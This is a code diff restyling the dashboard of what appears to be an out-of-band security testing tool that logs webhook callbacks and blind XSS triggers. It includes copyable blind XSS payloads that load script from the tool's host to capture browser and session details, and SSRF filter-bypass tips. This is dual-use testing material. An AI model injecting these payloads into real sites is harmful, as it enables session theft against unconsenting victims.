@@ -1307,7 +774,7 @@ export default function DashboardPage({ params }) {
                 >
                   <div className={styles.requestItemDetails}>
                     <div className={styles.requestItemHeader}>
-                      <span className={`${styles.methodPill}`} style={{ background: 'rgba(124, 77, 255, 0.15)', color: '#7c4dff', border: '1px solid rgba(124, 77, 255, 0.3)' }}>
+                      <span className={`${styles.methodPill} ${styles.methodPOST}`}>
                         XSS TRIGGER
                       </span>
                       <span className={styles.itemTime}>
@@ -1319,80 +786,93 @@ export default function DashboardPage({ params }) {
                     </div>
                     <div className={styles.itemMetaRow}>
                       <span className={styles.itemIP}>{trig.ip}</span>
-                      <span style={{ color: 'var(--color-secondary)' }}>ACTIVE</span>
+                      <span style={{ color: 'var(--color-primary)' }}>RECEIVED</span>
                     </div>
                   </div>
-                  <ChevronRight size={14} style={{ color: 'var(--text-dark)', alignSelf: 'center' }} />
+                  <ChevronRight size={14} style={{ color: 'var(--text-muted)', alignSelf: 'center' }} />
                 </div>
               ))
             )
           )}
 
           {activeTab === 'SSRF' && (
-            <div style={{ padding: '24px 20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
-              <span style={{ fontSize: '0.8rem', fontWeight: '750', color: 'var(--text-main)' }}>TACTICAL BYPASS RATIO</span>
-              <div style={{ padding: '16px', background: 'rgba(255,255,255,0.02)', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-light)' }}>
-                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', marginBottom: '8px' }}>
-                  <span>Anti-Blacklist Rates</span>
-                  <span style={{ color: '#00e676', fontWeight: '700' }}>98% Success</span>
+            <div style={{ padding: '18px 16px', display: 'flex', flexDirection: 'column', gap: '14px' }}>
+              <span style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--text-secondary)', textTransform: 'uppercase', letterSpacing: '0.04em' }}>
+                Bypass Techniques
+              </span>
+              <div style={{ padding: '12px', background: 'var(--bg-input)', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-light)' }}>
+                <div style={{ fontSize: '0.78rem', color: 'var(--text-main)', fontWeight: '600', marginBottom: '4px' }}>
+                  IP Encoding Representation
                 </div>
-                <div style={{ width: '100%', height: '4px', background: 'rgba(255,255,255,0.1)', borderRadius: '2px' }}>
-                  <div style={{ width: '98%', height: '100%', background: '#00e676', borderRadius: '2px' }}></div>
+                <div style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
+                  Alternative IP notations help verify parser robustness against strict regex filters or naive substring checks.
                 </div>
               </div>
 
-              <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
-                <div>💡 <strong>TIP 1:</strong> Binary, Hex, and decimal addresses are interpreted natively by browser engines and server socket commands like cURL/python requests.</div>
-                <div>💡 <strong>TIP 2:</strong> `0.0.0.0` points back to the internal localhost router of Unix servers, which often completely evades standard string checks matching `127.0.0.1`.</div>
+              <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', display: 'flex', flexDirection: 'column', gap: '8px', lineHeight: '1.45' }}>
+                <div><strong>• Hex / Octal / Dword:</strong> Interpreted directly by underlying network sockets (cURL, urllib, libc).</div>
+                <div><strong>• 0.0.0.0 / ::1:</strong> Binds to localhost in most Unix environments while bypassing explicit 127.0.0.1 checks.</div>
+                <div><strong>• DNS Rebinding:</strong> Resolves public domain to private address on secondary lookup.</div>
               </div>
             </div>
           )}
 
           {activeTab === 'PAYLOADS' && (
-            <div style={{ padding: '16px 14px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
-              <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px' }}>
-                Categories
+            <div style={{ padding: '14px 10px', display: 'flex', flexDirection: 'column', gap: '3px' }}>
+              <span style={{ fontSize: '0.7rem', fontWeight: '700', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px', letterSpacing: '0.04em' }}>
+                Categories ({payloadsData.length})
               </span>
-              {['ALL', 'XSS', 'SQLI', 'RCE', 'XXE', 'LFI', 'SSTI', 'LANG', 'ANDROID'].map(cat => (
+              <button
+                onClick={() => setSelectedPayloadCategory('ALL')}
+                style={{
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'space-between',
+                  width: '100%',
+                  padding: '7px 10px',
+                  borderRadius: 'var(--radius-xs)',
+                  background: selectedPayloadCategory === 'ALL' ? 'var(--color-primary-subtle)' : 'transparent',
+                  border: selectedPayloadCategory === 'ALL' ? '1px solid var(--color-primary-border)' : '1px solid transparent',
+                  color: selectedPayloadCategory === 'ALL' ? 'var(--color-primary)' : 'var(--text-secondary)',
+                  fontSize: '0.78rem',
+                  fontWeight: '600',
+                  cursor: 'pointer',
+                  textAlign: 'left',
+                  transition: 'all 0.15s ease'
+                }}
+              >
+                <span>All Categories</span>
+                <span style={{ fontSize: '0.7rem', opacity: 0.7 }}>
+                  {payloadsData.reduce((acc, c) => acc + c.items.length, 0)}
+                </span>
+              </button>
+
+              {payloadsData.map(cat => (
                 <button
-                  key={cat}
-                  onClick={() => setSelectedPayloadCategory(cat)}
+                  key={cat.category}
+                  onClick={() => setSelectedPayloadCategory(cat.category)}
                   style={{
                     display: 'flex',
                     alignItems: 'center',
+                    justifyContent: 'space-between',
                     width: '100%',
-                    padding: '10px 12px',
-                    borderRadius: 'var(--radius-md)',
-                    background: selectedPayloadCategory === cat ? 'rgba(0, 242, 254, 0.08)' : 'transparent',
-                    border: selectedPayloadCategory === cat ? '1px solid rgba(0, 242, 254, 0.2)' : '1px solid transparent',
-                    color: selectedPayloadCategory === cat ? 'var(--color-primary)' : 'var(--text-muted)',
-                    fontSize: '0.8rem',
-                    fontWeight: '650',
+                    padding: '7px 10px',
+                    borderRadius: 'var(--radius-xs)',
+                    background: selectedPayloadCategory === cat.category ? 'var(--color-primary-subtle)' : 'transparent',
+                    border: selectedPayloadCategory === cat.category ? '1px solid var(--color-primary-border)' : '1px solid transparent',
+                    color: selectedPayloadCategory === cat.category ? 'var(--color-primary)' : 'var(--text-secondary)',
+                    fontSize: '0.78rem',
+                    fontWeight: '600',
                     cursor: 'pointer',
                     textAlign: 'left',
                     transition: 'all 0.15s ease'
                   }}
-                  onMouseEnter={(e) => {
-                    if (selectedPayloadCategory !== cat) {
-                      e.currentTarget.style.background = 'rgba(255,255,255,0.02)';
-                      e.currentTarget.style.color = 'var(--text-main)';
-                    }
-                  }}
-                  onMouseLeave={(e) => {
-                    if (selectedPayloadCategory !== cat) {
-                      e.currentTarget.style.background = 'transparent';
-                      e.currentTarget.style.color = 'var(--text-muted)';
-                    }
-                  }}
                 >
-                  <span>
-                    {cat === 'ALL' 
-                      ? '📂 View All Payloads' 
-                      : cat === 'LANG' 
-                      ? '💻 Go / Python / JVM / Node' 
-                      : cat === 'ANDROID'
-                      ? '📱 Android (WebViews/Links)'
-                      : `☣️ ${cat}`}
+                  <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                    {cat.title}
+                  </span>
+                  <span style={{ fontSize: '0.7rem', opacity: 0.7, marginLeft: '6px' }}>
+                    {cat.items.length}
                   </span>
                 </button>
               ))}
@@ -1400,18 +880,18 @@ export default function DashboardPage({ params }) {
           )}
 
           {activeTab === 'NUCLEI' && (
-            <div style={{ padding: '16px 14px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
-              <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px' }}>
-                Nuclei Modules
+            <div style={{ padding: '14px 10px', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+              <span style={{ fontSize: '0.7rem', fontWeight: '700', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px', letterSpacing: '0.04em' }}>
+                Modules
               </span>
               {[
-                { id: 'ALL', label: '🚀 All Nuclei Modules' },
-                { id: 'BUILDER', label: '⚡ Interactive Command Generator' },
-                { id: 'OOB_SSRF', label: '🛰️ OOB SSRF / RCE Template' },
-                { id: 'BLIND_XSS', label: '🛡️ Blind XSS Header Fuzzer' },
-                { id: 'REPORTING', label: '🔔 Live Scan Webhook Export' },
-                { id: 'COMMUNITY', label: '📦 Local Community Templates' },
-                { id: 'CHEATSHEET', label: '📖 CLI Cheat Sheet' }
+                { id: 'ALL', label: 'All Modules' },
+                { id: 'BUILDER', label: 'Command Builder' },
+                { id: 'OOB_SSRF', label: 'OOB SSRF / RCE Template' },
+                { id: 'BLIND_XSS', label: 'Blind XSS Header Fuzzer' },
+                { id: 'REPORTING', label: 'Scan Webhook Export' },
+                { id: 'COMMUNITY', label: 'Community Templates' },
+                { id: 'CHEATSHEET', label: 'CLI Cheat Sheet' }
               ].filter(item => !nucleiSearchQuery || item.label.toLowerCase().includes(nucleiSearchQuery.toLowerCase())).map(sec => (
                 <button
                   key={sec.id}
@@ -1420,28 +900,16 @@ export default function DashboardPage({ params }) {
                     display: 'flex',
                     alignItems: 'center',
                     width: '100%',
-                    padding: '10px 12px',
-                    borderRadius: 'var(--radius-md)',
-                    background: selectedNucleiSection === sec.id ? 'rgba(0, 230, 118, 0.1)' : 'transparent',
-                    border: selectedNucleiSection === sec.id ? '1px solid rgba(0, 230, 118, 0.25)' : '1px solid transparent',
-                    color: selectedNucleiSection === sec.id ? '#00e676' : 'var(--text-muted)',
-                    fontSize: '0.8rem',
-                    fontWeight: '650',
+                    padding: '8px 10px',
+                    borderRadius: 'var(--radius-xs)',
+                    background: selectedNucleiSection === sec.id ? 'var(--color-primary-subtle)' : 'transparent',
+                    border: selectedNucleiSection === sec.id ? '1px solid var(--color-primary-border)' : '1px solid transparent',
+                    color: selectedNucleiSection === sec.id ? 'var(--color-primary)' : 'var(--text-secondary)',
+                    fontSize: '0.78rem',
+                    fontWeight: '600',
                     cursor: 'pointer',
                     textAlign: 'left',
                     transition: 'all 0.15s ease'
-                  }}
-                  onMouseEnter={(e) => {
-                    if (selectedNucleiSection !== sec.id) {
-                      e.currentTarget.style.background = 'rgba(255,255,255,0.02)';
-                      e.currentTarget.style.color = 'var(--text-main)';
-                    }
-                  }}
-                  onMouseLeave={(e) => {
-                    if (selectedNucleiSection !== sec.id) {
-                      e.currentTarget.style.background = 'transparent';
-                      e.currentTarget.style.color = 'var(--text-muted)';
-                    }
                   }}
                 >
                   <span>{sec.label}</span>
@@ -1461,7 +929,7 @@ export default function DashboardPage({ params }) {
             <header className={styles.panelHeader}>
               <div className={styles.urlContainer}>
                 <div className={styles.urlWrapper}>
-                  <span className={styles.urlLabel} style={{ color: '#00e676' }}>🛰 ... OOB Callback URL</span>
+                  <span className={styles.urlLabel}>Callback URL</span>
                   <input 
                     type="text" 
                     readOnly 
@@ -1480,42 +948,35 @@ export default function DashboardPage({ params }) {
 
                 <div className={styles.headerActions}>
                   {copiedText === 'config-saved' && (
-                    <span className="badge badge-success animate-fade-in" style={{ textTransform: 'none' }}>
-                      Response Settings Applied!
+                    <span className="badge badge-success animate-fade-in">
+                      Settings Saved
                     </span>
                   )}
                   
                   <button 
                     onClick={() => setIsPollingActive(!isPollingActive)} 
                     className="btn-secondary"
-                    style={{ 
-                      padding: '8px 12px', 
-                      fontSize: '0.8rem',
-                      borderColor: isPollingActive ? 'var(--color-primary-glow)' : 'var(--text-dark)',
-                      color: isPollingActive ? 'var(--color-primary)' : 'var(--text-muted)'
-                    }}
                   >
-                    <Radio size={14} className={isPollingActive ? 'animate-pulse-glow' : ''} />
-                    {isPollingActive ? 'Live Polling: ACTIVE' : 'Polling Paused'}
+                    <span className={isPollingActive ? styles.liveIndicator : styles.pausedIndicator} />
+                    <span>{isPollingActive ? 'Live Polling' : 'Paused'}</span>
                   </button>
 
                   <button 
                     onClick={() => setIsConfigOpen(true)}
                     className="btn-secondary"
-                    style={{ padding: '8px 12px', fontSize: '0.8rem' }}
                   >
                     <Settings size={14} />
-                    Customize Response
+                    <span>Response Config</span>
                   </button>
 
                   <button 
                     onClick={handleClearLogs}
                     disabled={requests.length === 0}
                     className="btn-secondary"
-                    style={{ padding: '8px 12px', fontSize: '0.8rem', color: 'var(--color-error)' }}
+                    style={{ color: 'var(--color-error)' }}
                   >
                     <Trash2 size={14} />
-                    Clear Logs
+                    <span>Clear</span>
                   </button>
                 </div>
               </div>
@@ -1524,47 +985,45 @@ export default function DashboardPage({ params }) {
             {requests.length === 0 ? (
               <div className={`${styles.emptyState} animate-fade-in`}>
                 <div className={styles.emptyStateContent}>
-                  <div className={styles.waitingIllustration}>
-                    <div className={styles.radarRing1}></div>
-                    <div className={styles.radarRing2}></div>
-                    <div className={styles.radarCenter}></div>
+                  <div className={styles.emptyIconBox}>
+                    <Terminal size={24} />
                   </div>
-                  <h2 className={styles.emptyStateTitle}>Awaiting Out-Of-Band Callback</h2>
+                  <h2 className={styles.emptyStateTitle}>Waiting for Incoming Requests</h2>
                   <p className={styles.emptyStateSubtitle}>
-                    Send an HTTP request to your custom OOB Callback URL above using any network client, scanner, tool, or copy-paste one of the testing payloads below into your terminal:
+                    Send an HTTP request to your callback URL above or test with the commands below:
                   </p>
                 </div>
 
                 <div className={styles.demoBox}>
                   <span className={styles.demoTitle}>
-                    <Radio size={15} className={styles.logoIcon} />
-                    Trigger an Out-of-Band POST callback using cURL
+                    <Terminal size={14} />
+                    cURL (POST JSON)
                   </span>
                   <div className={styles.codeBlock}>
                     {`curl -X POST -H "Content-Type: application/json" \\
-  -d '{"exploit": "successful", "message": "Out-of-Band connection established"}' \\
+  -d '{"status": "test", "message": "Webhook received successfully"}' \\
   ${webhookUrl}`}
                     <button 
-                      onClick={() => handleCopy(`curl -X POST -H "Content-Type: application/json" -d '{"exploit": "successful", "message": "Out-of-Band connection established"}' ${webhookUrl}`, 'curl')}
+                      onClick={() => handleCopy(`curl -X POST -H "Content-Type: application/json" -d '{"status": "test", "message": "Webhook received successfully"}' ${webhookUrl}`, 'curl')}
                       className={styles.demoCopyBtn}
                     >
-                      {copiedText === 'curl' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                      {copiedText === 'curl' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                     </button>
                   </div>
                 </div>
 
                 <div className={styles.demoBox}>
                   <span className={styles.demoTitle}>
-                    <Terminal size={15} className={styles.logoIcon} style={{ color: 'var(--color-secondary)' }} />
-                    Trigger an Out-of-Band GET callback using PowerShell
+                    <Terminal size={14} />
+                    PowerShell (GET)
                   </span>
                   <div className={styles.codeBlock}>
-                    {`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?trigger=powershell_handshake"`}
+                    {`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?test=1"`}
                     <button 
-                      onClick={() => handleCopy(`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?trigger=powershell_handshake"`, 'powershell')}
+                      onClick={() => handleCopy(`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?test=1"`, 'powershell')}
                       className={styles.demoCopyBtn}
                     >
-                      {copiedText === 'powershell' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                      {copiedText === 'powershell' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                     </button>
                   </div>
                 </div>
@@ -1576,19 +1035,19 @@ export default function DashboardPage({ params }) {
                 <section className={styles.summaryGrid}>
                   <div className={styles.summaryCard}>
                     <span className={styles.summaryLabel}>HTTP Method</span>
-                    <span className={`${styles.methodPill} ${styles['method' + selectedRequest.method] || styles.methodOTHER}`} style={{ fontSize: '0.9rem', padding: '6px 12px' }}>
+                    <span className={`${styles.methodPill} ${styles['method' + selectedRequest.method] || styles.methodOTHER}`} style={{ fontSize: '0.85rem', padding: '4px 10px' }}>
                       {selectedRequest.method}
                     </span>
                   </div>
                   <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Ingestion Timestamp</span>
+                    <span className={styles.summaryLabel}>Timestamp</span>
                     <span className={styles.summaryValue}>
                       {new Date(selectedRequest.timestamp).toLocaleString()}
                     </span>
                   </div>
                   <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Client IP Address</span>
-                    <span className={styles.summaryValue} style={{ color: '#00e676', fontFamily: 'monospace' }}>
+                    <span className={styles.summaryLabel}>Client IP</span>
+                    <span className={styles.summaryValue} style={{ fontFamily: 'monospace' }}>
                       {selectedRequest.ip}
                     </span>
                   </div>
@@ -1601,13 +1060,13 @@ export default function DashboardPage({ params }) {
                 </section>
 
                 {/* LOG DATA: HEADERS & PARAMS */}
-                <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                   
                   {/* HEADERS CARD */}
                   <section className={styles.dataCard}>
                     <div className={styles.sectionHeader}>
-                      <Network size={16} style={{ color: 'var(--color-primary)' }} />
-                      <h3 className={styles.sectionTitle}>Request Headers ({Object.keys(selectedRequest.headers).length})</h3>
+                      <Network size={15} style={{ color: 'var(--color-primary)' }} />
+                      <h3 className={styles.sectionTitle}>Headers ({Object.keys(selectedRequest.headers).length})</h3>
                     </div>
                     <div style={{ overflowX: 'auto' }}>
                       <table className={styles.headersTable}>
@@ -1627,7 +1086,7 @@ export default function DashboardPage({ params }) {
                   {Object.keys(selectedRequest.query).length > 0 && (
                     <section className={styles.dataCard}>
                       <div className={styles.sectionHeader}>
-                        <Globe size={16} style={{ color: 'var(--color-secondary)' }} />
+                        <Globe size={15} style={{ color: 'var(--color-primary)' }} />
                         <h3 className={styles.sectionTitle}>Query Parameters ({Object.keys(selectedRequest.query).length})</h3>
                       </div>
                       <div style={{ overflowX: 'auto' }}>
@@ -1635,7 +1094,7 @@ export default function DashboardPage({ params }) {
                           <tbody>
                             {Object.entries(selectedRequest.query).map(([key, val]) => (
                               <tr key={key}>
-                                <td className={styles.headerKey} style={{ color: 'var(--color-secondary)' }}>{key}</td>
+                                <td className={styles.headerKey} style={{ color: 'var(--text-secondary)' }}>{key}</td>
                                 <td className={styles.headerVal} style={{ fontFamily: 'monospace' }}>
                                   {Array.isArray(val) ? val.join(', ') : String(val)}
                                 </td>
@@ -1651,8 +1110,8 @@ export default function DashboardPage({ params }) {
                   {selectedRequest.body && (
                     <section className={styles.dataCard}>
                       <div className={styles.sectionHeader}>
-                        <FileCode size={16} style={{ color: 'var(--color-success)' }} />
-                        <h3 className={styles.sectionTitle}>Raw Body Payload ({selectedRequest.bodyType.toUpperCase()})</h3>
+                        <FileCode size={15} style={{ color: 'var(--color-primary)' }} />
+                        <h3 className={styles.sectionTitle}>Request Body ({selectedRequest.bodyType.toUpperCase()})</h3>
                         <button 
                           onClick={() => handleCopy(selectedRequest.body, 'body')}
                           className={styles.copyBtn}
@@ -1677,18 +1136,18 @@ export default function DashboardPage({ params }) {
                   {/* REQUEST REPLAY / FORWARDING CARD */}
                   <section className={styles.forwardSection}>
                     <div className={styles.sectionHeader} style={{ borderBottom: 'none', paddingBottom: '0' }}>
-                      <Send size={16} style={{ color: 'var(--color-primary)' }} />
-                      <h3 className={styles.sectionTitle}>Replay / Forward Request Payload</h3>
+                      <Send size={15} style={{ color: 'var(--color-primary)' }} />
+                      <h3 className={styles.sectionTitle}>Replay / Forward Request</h3>
                     </div>
-                    <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginTop: '4px' }}>
-                      Transmit this callback payload to an external staging server, your local system endpoint (e.g. ngrok), or another API pipeline.
+                    <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
+                      Forward this webhook payload to a local development endpoint (e.g. ngrok/localhost) or external server.
                     </p>
                     
                     <form onSubmit={handleForwardRequest} className={styles.forwardForm}>
                       <input 
                         type="url" 
                         required
-                        placeholder="https://api.yourdomain.com/v1/OOB-callback or http://localhost:8080/exploit"
+                        placeholder="http://localhost:3000/webhook or https://api.example.com/webhook"
                         value={forwardTarget}
                         onChange={(e) => setForwardTarget(e.target.value)}
                         className={`input-field ${styles.forwardInput}`}
@@ -1702,12 +1161,12 @@ export default function DashboardPage({ params }) {
                         {forwardState === 'loading' ? (
                           <>
                             <RefreshCw size={14} className="animate-spin" />
-                            Transmitting...
+                            Forwarding...
                           </>
                         ) : (
                           <>
                             <Play size={14} fill="currentColor" />
-                            Transmit Payload
+                            Forward Request
                           </>
                         )}
                       </button>
@@ -1717,38 +1176,38 @@ export default function DashboardPage({ params }) {
                       <div 
                         className="animate-fade-in"
                         style={{ 
-                          marginTop: '20px', 
-                          padding: '16px', 
-                          borderRadius: 'var(--radius-md)', 
+                          marginTop: '16px', 
+                          padding: '14px', 
+                          borderRadius: 'var(--radius-sm)', 
                           border: '1px solid var(--border-light)',
-                          background: 'rgba(0,0,0,0.2)' 
+                          background: 'var(--bg-canvas)' 
                         }}
                       >
-                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
-                          <span style={{ fontSize: '0.8rem', fontWeight: '750', color: 'var(--text-main)' }}>
-                            TRANSMISSION RESULT
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
+                          <span style={{ fontSize: '0.78rem', fontWeight: '600', color: 'var(--text-main)' }}>
+                            Forward Result
                           </span>
                           <span className={`badge ${forwardState === 'success' ? 'badge-success' : 'badge-error'}`}>
-                            {forwardState === 'success' ? `HTTP ${forwardResult.status}` : 'Transmission Failed'}
+                            {forwardState === 'success' ? `HTTP ${forwardResult.status}` : 'Forward Failed'}
                           </span>
                         </div>
 
-                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '12px' }}>
-                          <div>Transmission Latency: <strong style={{ color: 'var(--text-main)', fontFamily: 'monospace' }}>{forwardResult.durationMs} ms</strong></div>
+                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '8px' }}>
+                          <div>Latency: <strong style={{ color: 'var(--text-main)', fontFamily: 'monospace' }}>{forwardResult.durationMs} ms</strong></div>
                         </div>
 
                         {forwardResult.body && (
-                          <div style={{ marginTop: '10px' }}>
-                            <span style={{ fontSize: '0.7rem', fontWeight: '700', color: 'var(--text-muted)' }}>TARGET RESPONSE BODY:</span>
+                          <div style={{ marginTop: '8px' }}>
+                            <span style={{ fontSize: '0.7rem', fontWeight: '600', color: 'var(--text-secondary)' }}>Response Body:</span>
                             <pre 
                               style={{ 
                                 marginTop: '4px',
                                 padding: '10px', 
-                                borderRadius: '6px', 
-                                background: '#04060a', 
+                                borderRadius: 'var(--radius-xs)', 
+                                background: 'var(--bg-input)', 
                                 fontSize: '0.75rem', 
                                 fontFamily: 'monospace', 
-                                color: '#00e676',
+                                color: 'var(--text-main)',
                                 maxHeight: '150px',
                                 overflowY: 'auto',
                                 whiteSpace: 'pre-wrap',
@@ -1774,14 +1233,13 @@ export default function DashboardPage({ params }) {
             <header className={styles.panelHeader}>
               <div className={styles.urlContainer}>
                 <div className={styles.urlWrapper}>
-                  <span className={styles.urlLabel} style={{ color: '#7c4dff' }}>☣️ ... BLIND XSS PAYLOAD TAG</span>
+                  <span className={styles.urlLabel}>Blind XSS Script Tag</span>
                   <input 
                     type="text" 
                     readOnly 
                     value={`<script src="${xssPayloadUrl}"></script>`}
                     onClick={(e) => e.target.select()}
                     className={styles.urlInput}
-                    style={{ color: '#7c4dff' }}
                   />
                   <button 
                     onClick={() => handleCopy(`<script src="${xssPayloadUrl}"></script>`, 'xsstag')}
@@ -1796,25 +1254,19 @@ export default function DashboardPage({ params }) {
                   <button 
                     onClick={() => setIsPollingActive(!isPollingActive)} 
                     className="btn-secondary"
-                    style={{ 
-                      padding: '8px 12px', 
-                      fontSize: '0.8rem',
-                      borderColor: isPollingActive ? 'rgba(124, 77, 255, 0.4)' : 'var(--text-dark)',
-                      color: isPollingActive ? '#7c4dff' : 'var(--text-muted)'
-                    }}
                   >
-                    <Radio size={14} className={isPollingActive ? 'animate-pulse-glow' : ''} />
-                    {isPollingActive ? 'XSS Polling: ACTIVE' : 'Polling Paused'}
+                    <span className={isPollingActive ? styles.liveIndicator : styles.pausedIndicator} />
+                    <span>{isPollingActive ? 'Live Polling' : 'Paused'}</span>
                   </button>
 
                   <button 
                     onClick={handleClearXssLogs}
                     disabled={xssTriggers.length === 0}
                     className="btn-secondary"
-                    style={{ padding: '8px 12px', fontSize: '0.8rem', color: 'var(--color-error)' }}
+                    style={{ color: 'var(--color-error)' }}
                   >
                     <Trash2 size={14} />
-                    Clear XSS Hits
+                    <span>Clear Hits</span>
                   </button>
                 </div>
               </div>
@@ -1823,45 +1275,43 @@ export default function DashboardPage({ params }) {
             {xssTriggers.length === 0 ? (
               <div className={`${styles.emptyState} animate-fade-in`}>
                 <div className={styles.emptyStateContent}>
-                  <div className={styles.waitingIllustration} style={{ borderColor: 'rgba(124, 77, 255, 0.3)' }}>
-                    <div className={styles.radarRing1} style={{ border: '2px solid rgba(124, 77, 255, 0.15)' }}></div>
-                    <div className={styles.radarRing2} style={{ border: '2px solid rgba(124, 77, 255, 0.08)' }}></div>
-                    <div className={styles.radarCenter} style={{ background: '#7c4dff' }}></div>
+                  <div className={styles.emptyIconBox}>
+                    <ShieldAlert size={24} />
                   </div>
-                  <h2 className={styles.emptyStateTitle} style={{ color: 'var(--text-main)' }}>Awaiting Blind XSS Trigger</h2>
-                  <p className={styles.emptyStateSubtitle} style={{ maxWidth: '520px' }}>
-                    Inject your custom Kestrel Ghost XSS Script Tag into any target inputs, search fields, comments, or headers. When a victim (like an administrator) triggers the script, their parsed session details will pop up here instantly!
+                  <h2 className={styles.emptyStateTitle}>Awaiting XSS Triggers</h2>
+                  <p className={styles.emptyStateSubtitle}>
+                    Inject the script tag or payloads below into target inputs or headers. When triggered by a browser or admin panel, environment details will appear here.
                   </p>
                 </div>
 
-                <div className={styles.demoBox} style={{ borderColor: 'rgba(124, 77, 255, 0.2)' }}>
-                  <span className={styles.demoTitle} style={{ color: '#7c4dff' }}>
-                    <ShieldCheck size={15} />
-                    XSS Payload Example 1: Classic HTML Injection Script tag
+                <div className={styles.demoBox}>
+                  <span className={styles.demoTitle}>
+                    <Terminal size={14} />
+                    Payload Example 1: Standard Script Tag
                   </span>
-                  <div className={styles.codeBlock} style={{ color: 'var(--text-main)' }}>
+                  <div className={styles.codeBlock}>
                     {`"><script src="${xssPayloadUrl}"></script>`}
                     <button 
                       onClick={() => handleCopy(`"><script src="${xssPayloadUrl}"></script>`, 'demo1')}
                       className={styles.demoCopyBtn}
                     >
-                      {copiedText === 'demo1' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                      {copiedText === 'demo1' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                     </button>
                   </div>
                 </div>
 
-                <div className={styles.demoBox} style={{ borderColor: 'rgba(124, 77, 255, 0.2)' }}>
-                  <span className={styles.demoTitle} style={{ color: '#7c4dff' }}>
-                    <ShieldCheck size={15} />
-                    XSS Payload Example 2: Markdown / Image onerror payload
+                <div className={styles.demoBox}>
+                  <span className={styles.demoTitle}>
+                    <Terminal size={14} />
+                    Payload Example 2: Image Error Handler
                   </span>
-                  <div className={styles.codeBlock} style={{ color: 'var(--text-main)' }}>
+                  <div className={styles.codeBlock}>
                     {`<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`}
                     <button 
                       onClick={() => handleCopy(`<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 'demo2')}
                       className={styles.demoCopyBtn}
                     >
-                      {copiedText === 'demo2' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                      {copiedText === 'demo2' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                     </button>
                   </div>
                 </div>
@@ -1872,25 +1322,25 @@ export default function DashboardPage({ params }) {
                 {/* TRIGGERED INFO PANEL */}
                 <section className={styles.summaryGrid}>
                   <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Payload Origin</span>
-                    <span className={`${styles.methodPill}`} style={{ fontSize: '0.8rem', padding: '6px 12px', background: 'rgba(124, 77, 255, 0.15)', color: '#7c4dff', border: '1px solid rgba(124, 77, 255, 0.3)' }}>
+                    <span className={styles.summaryLabel}>Type</span>
+                    <span className={`${styles.methodPill} ${styles.methodPOST}`} style={{ fontSize: '0.85rem', padding: '4px 10px' }}>
                       BLIND XSS
                     </span>
                   </div>
                   <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Handshake Timestamp</span>
+                    <span className={styles.summaryLabel}>Timestamp</span>
                     <span className={styles.summaryValue}>
                       {new Date(selectedXss.timestamp).toLocaleString()}
                     </span>
                   </div>
                   <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Victim IP Address</span>
-                    <span className={styles.summaryValue} style={{ color: '#7c4dff', fontFamily: 'monospace' }}>
+                    <span className={styles.summaryLabel}>Client IP</span>
+                    <span className={styles.summaryValue} style={{ fontFamily: 'monospace' }}>
                       {selectedXss.ip}
                     </span>
                   </div>
                   <div className={styles.summaryCard}>
-                    <span className={styles.summaryLabel}>Source Domain / Location</span>
+                    <span className={styles.summaryLabel}>Source URL</span>
                     <span className={styles.summaryValue} title={selectedXss.uri} style={{ textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>
                       {selectedXss.uri}
                     </span>
@@ -1898,26 +1348,26 @@ export default function DashboardPage({ params }) {
                 </section>
 
